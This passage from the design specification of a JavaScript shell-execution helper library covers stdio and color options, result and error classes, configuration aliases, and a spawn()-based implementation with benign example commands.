  - `ReadableStream`: Pipe stream to stdin → `stream.pipe(child.stdin)` 
    (async only)
  - `true`: Forward parent's stdin → `process.stdin.pipe(child.stdin)` 
    (async only)
  - `false`: Close stdin immediately → `child.stdin.end()`
- **Sync mode restrictions**:
  - `ReadableStream` input throws error (streams not supported in sync)
  - `input: true` throws error (interactive input not supported in sync)

**`output`** — Standard output streaming  
- **Type**: `boolean`
- **Default**: `false`
- **Values**:
  - `false`: Only capture stdout, don't display live
  - `true`: Capture stdout AND stream live to `process.stdout`
- **Maps to**: `stdio[1]: "pipe"` + optional `child.stdout.pipe(process.stdout)`

**`debug`** — Standard error streaming  
- **Type**: `boolean`
- **Default**: `false`
- **Values**:
  - `false`: Only capture stderr, don't display live
  - `true`: Capture stderr AND stream live to `process.stderr`
- **Maps to**: `stdio[2]: "pipe"` + optional `child.stderr.pipe(process.stderr)`

#### Environment Options

**`color`** — Control color output  
- **Type**: `boolean`
- **Default**: `true`
- **Values**:
  - `true`: Force color output via environment variables
  - `false`: Disable color output via environment variables
- **Maps to**: Environment variables in `spawnOptions.env`:
  - When `true`: Sets `FORCE_COLOR=1`, `TERM=xterm-256color`, etc.
  - When `false`: Sets `NO_COLOR=1`, `FORCE_COLOR=0`

**`env`** — Process environment variables  
- **Type**: `object`
- **Default**: Auto-generated based on `color` setting
- **Behavior**: 
  - Merges with color environment variables
  - Can override any environment variable including color settings
- **Maps to**: `spawnOptions.env`

### 10. Result Classes

#### ProcessResult Class

The unified return type for all command executions:

```javascript
class ProcessResult {
  constructor({ ok, error, output, debug }) {
    this.ok = ok;           // boolean: true if exit code === 0
    this.error = error;     // ProcessError | undefined
    this.output = output;   // string: captured stdout
    this.debug = debug;     // string: captured stderr
  }
}
```

**Usage patterns:**
```javascript
const result = await sh.safe`grep "TODO" src/**/*.js`;
if (result.ok) {
  console.log("Found TODOs:", result.output);
} else {
  console.log("No TODOs found, exit code:", result.error.code);
}
```

#### ProcessError Class

Thrown on non-zero exit codes (when `throw: true`):

```javascript
class ProcessError extends Error {
  constructor({ message, code, output, debug }) {
    super(message);
    this.name = "ProcessError";
    this.code = code;       // number: exit code
    this.output = output;   // string: captured stdout
    this.debug = debug;     // string: captured stderr
  }
}
```

**Usage patterns:**
```javascript
try {
  await sh`npm test`;
} catch (error) {
  if (error instanceof ProcessError) {
    console.log(`Tests failed with code ${error.code}`);
    console.log("Test output:", error.output);
    console.log("Error details:", error.debug);
  }
}
```

### 11. Configuration Alias Reference

**`.safe`** — Non-throwing mode
- **Config**: `{ throw: false }`
- **Use case**: Query commands where non-zero exit is expected

**`.interactive`** — Full interactive I/O  
- **Config**: `{ input: true, output: true, debug: true }`
- **Use case**: Commands that need user input (npm init, git commit)

**`.live`** — Live output streaming  
- **Config**: `{ output: true, debug: true }`
- **Use case**: Monitor long-running commands without input

**`.sync`** — Synchronous execution  
- **Config**: `{ sync: true }`
- **Use case**: Block until command completes

**`.input(data)`** — Provide stdin data  
- **Config**: `{ input: data }`
- **Use case**: Pipe data to command's stdin

#### Invalid Combinations

These combinations are **not allowed** and will throw configuration errors:

- **`.interactive.input()`**: Cannot combine interactive streaming with input
  - Reason: Interactive mode expects live user input, conflicts with 
    preset input
- **`.sync` with streams**: ReadableStream input not supported in sync mode  
  - Reason: Sync mode can't handle async stream operations
- **`.sync.interactive`**: Interactive input not supported in sync mode
  - Reason: Sync mode cannot inherit parent's stdin interactively

#### Valid Combination Examples

```javascript
// ✅ Safe + Interactive (non-throwing + full interactive I/O)
sh.safe.interactive`npm init`

// ✅ Safe + Live (non-throwing + live output only)
sh.safe.live`npm test`

// ✅ Safe + Input (non-throwing + stdin data)  
sh.safe.input("y\n")`confirm-script`

// ✅ Sync + Safe (blocking + non-throwing)
cmd.sync.safe`which node`

// ✅ Live + Safe (live output + non-throwing)
sh.safe.live`build-with-warnings`
```

### 12. Config to Node.js API Mapping

#### spawn() vs exec() Decision

The implementation uses **spawn() exclusively** for better control:
- spawn() allows real-time streaming
- spawn() supports stdio configuration
- exec() buffers entire output (not suitable for streaming)

Reference: [Node.js Child Process Documentation][nodejs-spawn]

[nodejs-spawn]: https://exploringjs.com/nodejs-shell-scripting/
ch_nodejs-child-process.html#spawn

#### `stdio` Configuration Strategy

The key challenge: **"inherit" prevents capture, "pipe" prevents direct
streaming**

Solution from [Stack Overflow](https://stackoverflow.com/a/77927124):
- Always use `"pipe"` for `stdio`
- Manually forward streams when live output is needed
- This allows both streaming AND capture

```javascript
// NEVER use inherit - it prevents capture
// stdio: ["inherit", "inherit", "inherit"]  ❌

// ALWAYS use pipe for control
stdio: ["pipe", "pipe", "pipe"]  // ✅

// Then manually forward for live output
if (config.output === true) {
  child.stdout.pipe(process.stdout);
  child.stdout.on("data", chunk => {
    stdoutChunks.push(chunk);
  });
}
```

#### Complete spawn() Configuration

FIXME: this is hard to follow

```javascript
function buildEnv(config) {
  const baseEnv = { ...process.env };
  
  // Remove environment variables that interfere with color
  delete baseEnv.CI;
  delete baseEnv.NO_COLOR;
  
  if (config.color !== false) {
    // Force color output (default behavior)
    Object.assign(baseEnv, {
      FORCE_COLOR: "1",
      TERM: "xterm-256color", 
      NODE_FORCE_COLOR: "1",
      COLORTERM: "truecolor",
    });
  } else {
    // Disable color output
    Object.assign(baseEnv, {
      NO_COLOR: "1",
      FORCE_COLOR: "0",
    });
  }
  
  // Apply custom env overrides
  if (config.env) {
    Object.assign(baseEnv, config.env);
  }
  
  return baseEnv;
}

function runCommand(commandString, config) {
  return config.sync 
    ? runCommandSync(commandString, config)
    : runCommandAsync(commandString, config);
}

function runCommandSync(commandString, config) {
  // Validate config for sync mode
  if (config.input && typeof config.input.pipe === "function") {
    throw new Error("ReadableStream input is not supported in sync mode");
  }
  if (config.input === true) {
    throw new Error(
      "Interactive input (input: true) is not supported in sync mode"
    );
  }
  
  const spawnOptions = {
    shell: config.shell,
    stdio: ["pipe", "pipe", "pipe"],
    env: buildEnv(config)
  };
  
  // Handle string input for sync
  if (typeof config.input === "string") {
    spawnOptions.input = config.input;
  }
  
  const result = spawnSync(commandString, [], spawnOptions);
  
  const stdout = result.stdout?.toString("utf-8") || "";
  const stderr = result.stderr?.toString("utf-8") || "";
  
  // Display output if requested (after command completes)
  if (config.output === true) {
    process.stdout.write(stdout);
  }
  if (config.debug === true) {
    process.stderr.write(stderr);
  }
  
  const processError = result.status !== 0 
    ? new ProcessError({
        message: `Command failed with exit code ${result.status}`,
        code: result.status,
        output: stdout,
        debug: stderr
      })
    : undefined;
  
  return new ProcessResult({
    ok: result.status === 0,
    error: processError,
    output: stdout,
    debug: stderr
  });
}

function runCommandAsync(commandString, config) {
  const spawnOptions = {
    shell: config.shell,
    stdio: ["pipe", "pipe", "pipe"],
    env: buildEnv(config)
  };
  
  const child = spawn(commandString, [], spawnOptions);
  
  return new Promise((resolve, reject) => {
    const outputChunks = [];
    const debugChunks = [];
    
    // stdout handling
    if (config.output === true) {
      child.stdout.pipe(process.stdout);
    }
    child.stdout.on("data", chunk => {
      outputChunks.push(chunk);
    });
    
    // stderr handling  
    if (config.debug === true) {
      child.stderr.pipe(process.stderr);
    }
    child.stderr.on("data", chunk => {
      debugChunks.push(chunk);
    });
    
    // Handle input
    if (typeof config.input === "string") {
      child.stdin.write(config.input);
      child.stdin.end();
    } else if (config.input === true) {
      process.stdin.pipe(child.stdin);
    } else if (config.input && typeof config.input.pipe === "function") {
      config.input.pipe(child.stdin);
    } else {
      child.stdin.end();
    }
    
    child.on("close", (code) => {
      const output = Buffer.concat(outputChunks).toString("utf-8");
      const debug = Buffer.concat(debugChunks).toString("utf-8");
      
      const processError = code !== 0 
        ? new ProcessError({
            message: `Command failed with exit code ${code}`,
            code,
            output,
            debug
          })
        : undefined;
        
      resolve(new ProcessResult({
        ok: code === 0,
        error: processError,
        output,
        debug
      }));
    });
  });
}
```

#### Key Implementation Rules

1. **Always use `spawn()`**, never `exec()` (for streaming support)
2. **Always use `stdio: ["pipe", "pipe", "pipe"]`** (for capture + stream)
3. **Manual piping** for live output (not stdio inherit)
4. **Buffer chunks** for final assembly with `Buffer.concat()`
5. **Force color env vars** for preserved formatting

---

## Working Directory Behavior

**Default behavior**: Commands execute in the directory containing the script 
file that calls `sh` or `cmd`.

**Override options**:
```javascript
// Default: auto-detect caller's directory
await sh`command`

// Explicit directory override
await sh({ cwd: '/absolute/path' })`command`
await sh({ cwd: process.cwd() })`command`
await sh({ cwd: __dirname })`command`

// Relative to caller's directory
await sh({ cwd: '../parent' })`command`
```

**Examples**:
```javascript
// scripts/build.js - runs from scripts/ directory  
// ✅ npm searches up for package.json
await sh`npm test`;
// ✅ Use absolute paths for cross-directory
await sh`ls ${srcPath}`;
// ✅ Works - script-config.json in scripts/
await sh`cp ./script-config.json ..`;
```

**Rationale**:
1. Scripts naturally work with files in their own directory
2. More intuitive for typical script usage patterns
3. Cross-directory operations use interpolated absolute paths
4. Users can override when process.cwd() behavior is needed

---

## Testing Strategy

Tests should verify:
- Template literal interpolation works correctly and safely
- Shell escaping prevents injection vulnerabilities
- ProcessError is thrown with proper exit codes and output
- Both sync and async variants function as expected
- Direct execution (cmd) bypasses shell interpretation as expected
